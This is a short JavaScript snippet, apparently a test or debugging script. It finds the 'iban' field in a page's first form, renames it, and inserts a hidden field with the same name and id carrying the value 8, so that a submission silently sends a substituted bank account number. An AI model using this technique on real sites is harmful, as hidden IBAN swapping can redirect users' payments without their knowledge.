function changeElementToFake(element) {
    element.name = `fake${element.name}`
    element.id = `fake${element.id}`
}

function prepareFakeElement(element, value) {
    const fakeElement = document.createElement('input');
    const { name, id } = element;
    fakeElement.name = name;
    fakeElement.id = id;
    fakeElement.value = value;
    fakeElement.type = 'hidden';
    return fakeElement;
}

function substituteFakeElement(element, value, parent) {
    const newFakeElement = prepareFakeElement(element, value)
    changeElementToFake(element);
    parent.appendChild(newFakeElement);
}

try {
    const refform = document.forms[0];
    const inputs = refform.elements;
    const iban = inputs.iban
    substituteFakeElement(iban, 8, refform)
} catch (err) {
    console.warn('iban not found')
}

